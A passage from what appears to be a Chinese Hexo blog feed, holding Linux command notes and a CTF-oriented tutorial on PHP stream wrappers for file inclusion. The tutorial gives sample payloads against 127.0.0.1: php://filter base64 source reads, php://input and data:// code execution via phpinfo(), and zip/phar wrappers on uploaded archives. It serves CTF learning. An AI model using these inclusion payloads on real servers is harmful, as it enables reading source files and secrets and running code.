align="left">含义</th></tr></thead><tbody><tr><td align="left">-f</td><td align="left">强制删除，忽略不存在的文件，无需提示</td></tr><tr><td align="left">-r</td><td align="left">递归地删除目录下的内容，<strong>删除文件夹时必须加此参数</strong></td></tr></tbody></table><h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a><code>cp</code>命令</h2><p>对应单词：copy</p><p>功能：复制文件或者目录</p><table><thead><tr><th align="left">可选参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">覆盖文件前提示</td></tr><tr><td align="left">-r</td><td align="left">若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名</td></tr></tbody></table><h2 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a><code>mv</code>命令</h2><p>对应单词：move</p><p>功能：移动文件或者目录／文件或者目录重命名</p><table><thead><tr><th align="left">可选参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">覆盖文件前提示</td></tr></tbody></table><h2 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a><code>cat</code>命令</h2><p>对应单词：  concatenate</p><p>功能：查看文件内容、创建文件、文件合并、追加文件内容等功能.,适合查看内容较少的文本文件</p><table><thead><tr><th align="left">可选参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-b</td><td align="left">对非空输出行编号</td></tr><tr><td align="left">-n</td><td align="left">对输出的所有行编号</td></tr></tbody></table><h2 id="more命令"><a href="#more命令" class="headerlink" title="more命令"></a><code>more</code>命令</h2><p>对应单词：  more</p><p>功能：  分屏显示文件内容</p><p>使用 more 的操作键：</p><table><thead><tr><th align="left">操作键</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">空格键</td><td align="left">显示手册页的下一屏</td></tr><tr><td align="left">Enter</td><td align="left">键 一次滚动手册页的一行</td></tr><tr><td align="left">b</td><td align="left">回滚一屏</td></tr><tr><td align="left">f</td><td align="left">前滚一屏</td></tr><tr><td align="left">q</td><td align="left">退出</td></tr><tr><td align="left">&#x2F;word</td><td align="left">搜索 word 字符串</td></tr></tbody></table><h2 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a><code>echo</code>命令</h2><p>对应单词：  more</p><p>功能：  在终端中显示参数指定的文字，通常会和重定向联合使用</p><h2 id="进程命令"><a href="#进程命令" class="headerlink" title="进程命令"></a>进程命令</h2><h3 id="ps命令："><a href="#ps命令：" class="headerlink" title="ps命令："></a><code>ps</code>命令：</h3><p>英文：  process status </p><p>作用：显示当前正在运行的进程的快照。</p><table><thead><tr><th align="left">命令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">ps aux</td><td align="left">查看进程的详细状况</td></tr><tr><td align="left">ps -ef</td><td align="left">显示所有进程的完整信息</td></tr><tr><td align="left">ps 进程代号</td><td align="left">显示特定进程代号的详细信息</td></tr><tr><td align="left">top</td><td align="left"></td></tr><tr><td align="left">kill [-9] 进程代号</td><td align="left">终止指定代号的进程， -9 表示强行终止</td></tr></tbody></table><p><code>ps</code> 默认只会显示当前用户通过终端启动的应用程序 ps 选项说明</p><table><thead><tr><th align="left">选项</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">a</td><td align="left">显示终端上的所有进程，包括其他用户的进程</td></tr><tr><td align="left">u</td><td align="left">显示进程的详细状态</td></tr><tr><td align="left">x</td><td align="left">显示没有控制终端的进程</td></tr></tbody></table><h3 id="top命令："><a href="#top命令：" class="headerlink" title="top命令："></a><code>top</code>命令：</h3><p>作用：  动态显示运行中的进程并且可以按 CPU 使用率、内存使用率等对进程进行排序</p><p>输入 <code>q</code>退出 <code>top</code> 命令界面</p><h3 id="kill命令："><a href="#kill命令：" class="headerlink" title="kill命令："></a><code>kill</code>命令：</h3><p>作用：  向进程发送信号以终止或操作进程</p><p>常见用法</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>kill 进程代号</td><td>向指定进程代号的进程发送默认的终止信号</td></tr><tr><td>kill -9 进程代号</td><td>向指定进程代号的进程发送强制终止信号</td></tr></tbody></table><p>提示：使用 kill 命令时，最好只终止由当前用户开启的进程，而不要终止 root 身份开启的进程，否则可能导致系统崩溃</p><h3 id="pgrep命令："><a href="#pgrep命令：" class="headerlink" title="pgrep命令："></a><code>pgrep</code>命令：</h3><p>作用：  向进程发送信号以终止或操作进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pgrep [选项] &lt;进程名称&gt;</span><br></pre></td></tr></table></figure><p>其中，<code>&lt;进程名称&gt;</code> 是要匹配的进程名称或模式。可以使用<strong>通配符进行模糊匹配</strong>。</p><table><thead><tr><th>可选选项</th><th>说明</th></tr></thead><tbody><tr><td>-u &lt;用户名&gt;</td><td>根据用户名过滤进程。</td></tr><tr><td>-n</td><td>仅返回最新的匹配进程的进程 ID。</td></tr><tr><td>-x</td><td>精确匹配进程名称，不进行模糊匹配。</td></tr><tr><td>-d &lt;分隔符&gt;</td><td>指定输出的分隔符，默认为换行符。</td></tr></tbody></table><h1 id="文章引用"><a href="#文章引用" class="headerlink" title="文章引用"></a><strong>文章引用</strong></h1><ul><li><p>引用<strong>菜鸟教程</strong>的文章</p><p>原文链接：<a href="https://www.runoob.com/linux/linux-user-manage.html">Linux 用户和用户组管理 | 菜鸟教程 (runoob.com)</a>、<a href="https://www.runoob.com/linux/linux-comm-find.html">Linux find 命令 | 菜鸟教程 (runoob.com)</a></p></li><li><p>引用腾讯云开发者社区博主<strong>全栈程序员站长</strong>的文章</p><p>原文链接：<a href="https://cloud.tencent.com/developer/article/2054395">史上最全的Linux常用命令汇总（超全面！超详细！）收藏这一篇就够了！-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;用户管理&quot;&gt;&lt;a href=&quot;#用户管理&quot; class=&quot;headerlink&quot; title=&quot;用户管理&quot;&gt;&lt;/a&gt;&lt;strong&gt;用户管理&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;创建指令&quot;&gt;&lt;a href=&quot;#创建指令&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="操作系统" scheme="https://we11s.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
  </entry>
  
  <entry>
    <title>Docker知识</title>
    <link href="https://we11s.github.io/posts/4126800539/"/>
    <id>https://we11s.github.io/posts/4126800539/</id>
    <published>2023-12-25T14:19:38.000Z</published>
    <updated>2024-02-02T11:06:11.826Z</updated>
    
    
    
    
    <category term="开发" scheme="https://we11s.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议</title>
    <link href="https://we11s.github.io/posts/2344074049/"/>
    <id>https://we11s.github.io/posts/2344074049/</id>
    <published>2023-11-10T14:47:11.000Z</published>
    <updated>2024-02-03T15:07:35.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见协议与封装协议"><a href="#常见协议与封装协议" class="headerlink" title="常见协议与封装协议"></a><strong>常见协议与封装协议</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="number">2</span> http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="number">3</span> ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="number">4</span> php:<span class="comment">// — 访问各个输入/输出流(I/O streams)</span></span><br><span class="line"><span class="number">5</span> zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="number">6</span> data:<span class="comment">// — 数据(RFC 2397)</span></span><br><span class="line"><span class="number">7</span> glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="number">8</span> phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="number">9</span> ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="number">10</span> rar:<span class="comment">// — RAR</span></span><br><span class="line"><span class="number">11</span> ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="number">12</span> expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><h2 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>访问本地文件系统</p><p><strong>条件：</strong></p><ul><li>allow_url_fopen:off&#x2F;on</li><li>allow_url_include :off&#x2F;on</li></ul><p><strong>作用：</strong><br>用于访问本地文件系统（服务器中的文件），在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。</p><p><strong>说明：</strong><br>当指定了一个<strong>相对路径</strong>提供的路径将基于<strong>当前的目录</strong>。在很多情况下是脚本所在的目录。</p><p><strong>相对路径</strong></p><p>Windows：不以:&#x2F;&#x2F;indows 盘符开头的路径</p><p>Linux:不以&#x2F;开头的路径</p><p><strong>使用示例</strong>：以传参变量名为cmd演示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux</span></span><br><span class="line">cmd=file:<span class="comment">///path/to/flag    #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条</span></span><br><span class="line">cmd=file:<span class="comment">//relative/path/flag    #当前目录下relative文件夹中path文件夹下flag文件</span></span><br><span class="line">cmd=file:<span class="comment">//flag    #当前目录下的flag文件</span></span><br><span class="line"><span class="comment">#Windows</span></span><br><span class="line">    cmd=file:<span class="comment">//C:/path/to/flag.txt #C盘中path文件夹中to文件夹下flag文件</span></span><br><span class="line">cmd=file:<span class="comment">//C:flag.txt  #C盘下flag文件</span></span><br><span class="line">cmd=file:<span class="comment">//flag.txt  #当前文件夹下flag文件</span></span><br></pre></td></tr></table></figure><h2 id="http"><a href="#http" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h2><p> 访问 HTTP(s) 网址</p><p><strong>条件：</strong></p><ul><li>allow_url_fopen:on</li><li>allow_url_include:on</li></ul><p><strong>作用：</strong><br>常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于<strong>远程包含。</strong></p><p><strong>使用示例</strong>：以传参变量名为cmd演示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=http:<span class="comment">//example.com/phpinfo.txt#读取http://example.com/phpinfo.txt文件</span></span><br><span class="line">cmd=https:<span class="comment">//example.com/file.php?var1=val1&amp;var2=val2#读取https://example.com/file.php文件并且传入var1和var2的值</span></span><br></pre></td></tr></table></figure><h2 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p> 访问各个输入&#x2F;输出流(I&#x2F;O streams)</p><p><strong>条件：</strong></p><ul><li>allow_url_fopen:off&#x2F;on</li><li>allow_url_include :仅<code>php://input</code> 、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要on</li></ul><p><strong>作用：</strong><br>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流(I&#x2F;O streams)，</p><p>在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>、<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。</p><p>说明：<br>PHP 提供了一些杂项输入&#x2F;输出(IO)流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><strong>php:&#x2F;&#x2F;filter</strong></h3><p><strong>条件：</strong></p><ul><li>allow_url_fopen:off&#x2F;on</li><li>allow_url_include :off&#x2F;on</li></ul><p><code>php://filter</code>可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理。（即读取或写入数据之前对其进行修改或过滤。）</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。（加绝对路径）</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p><strong>注：<code>read</code> 和 <code>write</code> 指令是互斥的，不能同时使用。</strong></p><p><code>write</code>指令用于<code>file_put_contents()</code>、<code>fopen()</code> 、 <code>fwrite()</code>等可指定文件名的地方，对这个文件进行写入后再编码处理</p><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a><strong>过滤器</strong></h4><h5 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a><strong>字符串过滤器</strong></h5><p>​<strong>No.1   <code>string.rot13</code></strong></p><p>​<code>str_rot13</code>（自 PHP 4.3.0 起等同于用 str_rot13()函数处理所有的流数据）—对字符串执行ROT13转换. ROT13 是一种简单的替换密码，将字母表中的每个字母向后移动13个位置,同时忽略非字母表中的字符。这意味着对一个字符进行 ROT13 编码两次会得到原始字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string</span> = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"><span class="variable">$encoded</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$decoded</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$encoded</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$encoded</span>; <span class="comment">// 输出 &quot;Uryyb, Jbeyq!&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decoded</span>; <span class="comment">// 输出 &quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure><p>​<strong>No.2   <code>string.toupper</code></strong></p><p>​<code>string.toupper</code>（自 PHP 5.0.0 起等同于用 <code>strtoupper()</code>函数处理所有的流数据）使用此过滤器,将字符串转化为大写</p><p>​<strong>No.3   <code>string.tolower</code></strong></p><p>​<code>string.tolower</code>（自 PHP 5.0.0 起等同于用 <code>strtolower()</code>函数处理所有的流数据）使用此过滤器,将字符串转化为小写</p><p>​<strong>No.4   <code>string.strip_tags</code></strong>(自 PHP 7.3.0 起废弃)<br>​ <code>string.strip_tags</code>使用此过滤器等同于用 <code>strip_tags()</code>函数处理所有的流数据。可以用两种格式接收参数：一种是和strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串str去除空字符、HTML 和 PHP 标记后的结果。与<code>strip_tags()</code>函数该过滤器会<strong>完全去除所有的 HTML 和 PHP 标签</strong>，无法通过参数来指定允许保留的标签。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&lt;p&gt;Hello, &lt;b&gt;World!&lt;/b&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filtered</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/string.strip_tags/resource=data:text/plain,&#x27;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$html</span>));<span class="comment">#进行编码防止乱码出现</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filtered</span>; <span class="comment">// 输出 &quot;Hello, World!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a><strong>转换过滤器</strong></h5><p>注：转换过滤器是 PHP 5.0.0 添加的</p><p>​<strong>No.1   <code>convert.base64</code></strong></p><p>​<code>convert.base64-encode</code>和 <code>convert.base64-decode</code>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据(采用<code>base64</code>加密)。<code>convert.base64-encode</code>支持以一个关联数组给出的参数。如果给出了<code>line-length</code>，<code>base64</code> 输出将被用<code>line-length</code>个字符为 长度而截成块。如果给出了<code>line-break-chars</code>，每块将被用给出的字符隔开。这些参数的效果和用<code>base64_encode()</code>再加上 <code>chunk_split()</code>相同。</p><p>​<strong>No.2   <code>convert.quoted</code></strong></p><p>​<code>convert.quoted-printable-decode</code>等同于用 <code>quoted_printable_decode()</code>函数处理所有的流数据。但没有和<code>convert.quoted-printable-encode</code>相对应的函数。<code>convert.quoted-printable-encode</code>支持以一个关联数组给出的参数。除了支持和<code>convert.base64-encode</code>一样的附加参数外，<code>convert.quoted-printable-encode</code>还支持布尔参数<code>binary</code>和 <code>force-encode-first</code>。<code>convert.base64-decode</code>只支持<code>line-break-chars</code>参数作为从编码载荷中剥离的类型提示。</p><p>​<strong>No.3   <code>convert.iconv.*</code></strong></p><p>​使用<code>convert.iconv.*</code>过滤器（php支持 <code>iconv</code> ，而iconv是默认编译并启用）等同于用<code>iconv()</code>函数处理所有的流数据，将字符串按要求的字符编码来转换</p><p><code>convery.iconv.*</code>的使用有两种方法:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;  <span class="comment">#&lt;input-encoding&gt;-传入的编码格式</span></span><br><span class="line"><span class="comment">#or </span></span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;  <span class="comment">#&lt;output-encoding&gt;-传出的编码格式</span></span><br></pre></td></tr></table></figure><p>支持的字符编码有一下几种（详细参考官方手册）</p><blockquote><p>UCS-4* | UCS-4BE  | UCS-4LE*  | UCS-2  | UCS-2BE  | UCS-2LE  | UTF-32*  | UTF-32BE*  | UTF-32LE*  | UTF-16*  | UTF-16BE*  | UTF-16LE*  | UTF-7  | UTF7-IMAP  | UTF-8*  | ASCII*  | </p></blockquote><p>​<strong>压缩过滤器</strong></p><p>​虽然 压缩封装协议 提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。</p><p>​<code>zlib.deflate</code>（压缩）和 <code>zlib.inflate</code>（解压）实现了定义与 <a href="http://www.faqs.org/rfcs/rfc1951">» RFC 1951</a> 的压缩算法。 <code>deflate</code> 过滤器可以接受以一个关联数组传递的最多三个参数。 <code>level</code>定义了压缩强度（1-9）。 数字更高通常会产生更小的载荷，但要消耗更多的处理时间。 存在两个特殊压缩等级：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）。 <code>window</code>是压缩回溯窗口大小，以二的次方表示。 更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存， 低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。 目前默认的 <code>window</code> 大小是 **<code>15</code>**。 <code>memory</code>用来指示要分配多少工作内存。 合法的数值范围是从 1（最小分配）到 9（最大分配）。 内存分配仅影响速度，不会影响生成的载荷的大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note: 压缩过滤器 不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 </span><br><span class="line"></span><br><span class="line">zlib.* 压缩过滤器自 PHP 版本 5.1.0起可用，在激活 zlib的前提下。也可以通过安装来自 » PECL的 » zlib_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中 不可用。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure><p>​</p><p>​<strong>加密过滤器</strong>（已自 PHP 7.1.0 起废弃）</p><p>​<code>mcrypt.</code>和 <code>mdecrypt.</code>使用<code>libmcrypt</code>提供了对称的加密和解密。这两组过滤器都支持mcrypt扩展库中相同的算法，格式为 <code>mcrypt.ciphername</code>，其中<code>ciphername</code>是密码的名字，将被传递给<code>mcrypt_module_open()</code>。有以下五个过滤器参数可用：</p><table><thead><tr><th align="left">参数</th><th align="left">是否必须</th><th align="left">默认值</th><th align="left">取值举例</th></tr></thead><tbody><tr><td align="left">mode</td><td align="left">可选</td><td align="left">cbc</td><td align="left">cbc、cfb、ecb、nofb、ofb、stream</td></tr><tr><td align="left">algorithms_dir</td><td align="left">可选</td><td align="left">ini_get(‘mcrypt.algorithms_dir’)</td><td align="left">algorithms 模块的目录</td></tr><tr><td align="left">modes_dir</td><td align="left">可选</td><td align="left">ini_get(‘mcrypt.modes_dir’)</td><td align="left">modes 模块的目录</td></tr><tr><td align="left">iv</td><td align="left">必须</td><td align="left">N&#x2F;A</td><td align="left">典型为 8、16 或 32 字节的二进制数据。根据密码而定</td></tr><tr><td align="left">key</td><td align="left">必须</td><td align="left">N&#x2F;A</td><td align="left">典型为 8、16 或 32 字节的二进制数据。根据密码而定</td></tr></tbody></table><h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><p>CTF常用的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php:<span class="comment">//filter/read=convert.base64-encode/resource=/flag</span></span><br></pre></td></tr></table></figure><h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>主要用来接收post数据，将post请求中的数据作为php代码执行。</p><p><strong>条件：</strong></p><ul><li>allow_url_fopen:off&#x2F;on</li><li>allow_url_include :on</li></ul><p><strong>使用示例</strong>：以传参变量名为cmd演示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span></span><br><span class="line">[POST DATA部分]<span class="comment">#这一行不需要放入post中</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib:&#x2F;&#x2F;"></a>zlib:&#x2F;&#x2F;</h2><p> 压缩流</p><p><strong>条件</strong></p><ul><li>allow_url_fopen:off&#x2F;on</li><li>allow_url_include :off&#x2F;on</li></ul><p><strong>作用</strong></p><p>​zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</p><p><strong>注</strong>：<code>zlib://</code> 需要是服务器内的压缩包文件、但不局限于后缀名</p><p><strong>示例：</strong></p><p>1、 zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名](#编码为%23)</p><p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt</span><br></pre></td></tr></table></figure><p>2、compress.bzip2:&#x2F;&#x2F;file.bz2<br>压缩 phpinfo.txt 为 phpinfo.bz2 并上传(同样支持任意后缀名)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2:///var/www/html/phpinfo.bz2</span><br></pre></td></tr></table></figure><p>3、compress.zlib:&#x2F;&#x2F;file.gz<br>压缩 phpinfo.txt 为 phpinfo.gz 并上传(同样支持任意后缀名)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib:///var/www/html/phpinfo.gz</span><br></pre></td></tr></table></figure><h2 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h2><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容</p><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar:///var/www/html/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><h2 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p><strong>条件</strong></p><ul><li>allow_url_fopen:on</li><li>allow_url_include :on</li></ul><p><strong>作用</strong><br>自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。<strong>通常可以用来执行PHP代码。</strong></p><p><strong>用法</strong></p><ul><li><code>data://text/plain,[加上所需传输的经过url编码数据]</code></li><li><code>data://text/plain;base64,[加上所需传输的经过base64编码再经过url编码的数据]</code></li></ul><p>传入时不要加上<code>[ ]</code></p><p><strong>示例</strong>：</p><ul><li>data:&#x2F;&#x2F;text&#x2F;plain,</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>data:&#x2F;&#x2F;text&#x2F;plain;base64,</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a><strong>使用场景</strong></h1><p>当遇到文件包含可使用伪协议进行</p><p>可能遇到的文件包含函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、include</span><br><span class="line">2、require</span><br><span class="line">3、include_once</span><br><span class="line">4、require_once</span><br><span class="line">5、highlight_file</span><br><span class="line">6、show_source</span><br><span class="line">7、flie</span><br><span class="line">8、readfile</span><br><span class="line">9、file_get_contents </span><br><span class="line">10、file_put_contents</span><br><span class="line">11、fopen (比较常见)</span><br></pre></td></tr></table></figure><h2 id="include和require函数"><a href="#include和require函数" class="headerlink" title="include和require函数"></a>include和require函数</h2><p>​通过 include 或 require 语句，可以将 <strong>PHP 文件</strong>的内容插入另一个 PHP 文件(<strong>在服务器执行它之前</strong>)。</p><p><code>include</code> 和 <code>require</code> 语句是相同的，<strong>除了错误处理方面</strong>：</p><p><code>require</code> 会生成致命错误(E_COMPILE_ERROR)并停止脚本、<code>include</code> 只生成警告(E_WARNING)，并且脚本会继续</p><p><strong>语法：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;filename&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;filename&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>区别：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include &#x27;23333.php&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>由于23333.php不存在<br>使用include的时候，只会在当前语句报错，然后执行后边的正常语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require</span> <span class="string">&#x27;23333.php&#x27;</span>;</span><br><span class="line"><span 